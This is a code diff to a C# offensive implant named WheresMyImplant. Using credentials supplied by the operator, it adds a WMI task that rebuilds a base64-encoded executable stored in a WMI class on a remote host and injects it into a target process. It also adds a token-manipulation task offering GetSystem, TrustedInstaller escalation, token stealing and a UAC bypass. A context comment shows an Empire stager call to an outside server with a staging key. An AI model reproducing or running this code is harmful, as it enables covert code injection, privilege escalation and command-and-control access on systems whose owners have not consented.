@@ -272,7 +272,54 @@ namespace WheresMyImplant
            }
            return output;
         }
-       
+
+        [ManagementTask]
+        public static string InjectPeWMIFSRemote(Int32 processId, string wmiClass, string system, string username, string password, string fileName, string parameters)
+        {
+            string output = "";
+
+            ConnectionOptions options = new ConnectionOptions();
+
+            options.Username = username;
+            options.Password = password;
+
+            ManagementScope scope = new ManagementScope("\\\\" + system + "\\root\\cimv2", options);
+            scope.Connect();
+
+            ObjectQuery queryIndexCount = new ObjectQuery("SELECT Index FROM WMIFS WHERE FileName = \'" + fileName + "\'");
+            ManagementObjectSearcher searcherIndexCount = new ManagementObjectSearcher(scope, queryIndexCount);
+            ManagementObjectCollection queryIndexCollection = searcherIndexCount.Get();
+            int indexCount = queryIndexCollection.Count;
+
+            String EncodedText = "";
+            for (int i = 0; i < indexCount; i++)
+            {
+                ObjectQuery queryFilePart = new ObjectQuery("SELECT FileStore FROM WMIFS WHERE FileName = \'" + fileName + "\' AND Index = \'" + i + "\'");
+                ManagementObjectSearcher searcherFilePart = new ManagementObjectSearcher(scope, queryFilePart);
+                ManagementObjectCollection queryCollection = searcherFilePart.Get();
+                foreach (ManagementObject filePart in queryCollection)
+                {
+                    EncodedText += filePart["FileStore"].ToString();
+                }
+            }
+
+            byte[] peBytes = System.Convert.FromBase64String(EncodedText);
+            PELoader peLoader = new PELoader(peBytes);
+            InjectPERemote injectPE = new InjectPERemote((UInt32)processId, peLoader, parameters);
+            try
+            {
+                injectPE.execute();
+            }
+            catch
+            {
+                output = "[-] Execution Failed\n";
+            }
+            finally
+            {
+                output += injectPE.GetOutput();
+            }
+            return output;
+        }
        
         [ManagementTask]
         //Invoke-WmiMethod -Class Win32_Implant -Name EmpireStager -ArgumentList "powershell","http://192.168.255.100:80","q|Q]KAe!{Z[:Tj<s26;zd9m7-_DMi3,5"
@@ -282,6 +329,69 @@ namespace WheresMyImplant
            EmpireStager empireStager = new EmpireStager(server, stagingKey, language);
            empireStager.execute();
            return empireStager.GetOutput();
+        }
+
+        [ManagementTask]
+        public static string Tokenvator(string command)
+        {
+            Tokens tokenvator = new Tokens();
+            if (command.ToLower().Contains("getsystem"))
+            {
+                String[] split = command.Split(' ');
+                if (split.Length >= 2)
+                {
+                    new Tokens().GetSystem(split[1]);
+                }
+                else
+                {
+                    new Tokens().GetSystem("cmd.exe");
+                }
+            }
+            else if (command.ToLower().Contains("gettrustedinstaller"))
+            {
+                String[] split = command.Split(' ');
+                if (split.Length >= 2)
+                {
+                    new Tokens().GetTrustedInstaller(split[1]);
+                }
+                else
+                {
+                    new Tokens().GetTrustedInstaller("cmd.exe");
+                }
+            }
+            else if (command.ToLower().Contains("stealtoken"))
+            {
+                String[] split = command.Split(' ');
+                if (split.Length >= 3)
+                {
+                    new Tokens().StartProcessAsUser(Int32.Parse(split[1]), split[2]);
+                }
+                else
+                {
+                    new Tokens().StartProcessAsUser(Int32.Parse(split[1]), "cmd.exe");
+                }
+            }
+            else if (command.ToLower().Contains("bypassuac"))
+            {
+                String[] split = command.Split(' ');
+                if (split.Length >= 3)
+                {
+                    new RestrictedToken().BypassUAC(Int32.Parse(split[1]), split[2]);
+                }
+                else
+                {
+                    new RestrictedToken().BypassUAC(Int32.Parse(split[1]), "cmd.exe");
+                }
+            }
+            else
+            {
+                Console.WriteLine("Invalid Options");
+                Console.WriteLine("GetSystem            <new_process>");
+                Console.WriteLine("GetTrustedInstaller  <new_process>");
+                Console.WriteLine("StealToken           <process_id> <new_process>");
+                Console.WriteLine("BypassUAC            <process_id> <new_process>");
+            }
+            return tokenvator.GetOutput();
         }
     }
 }
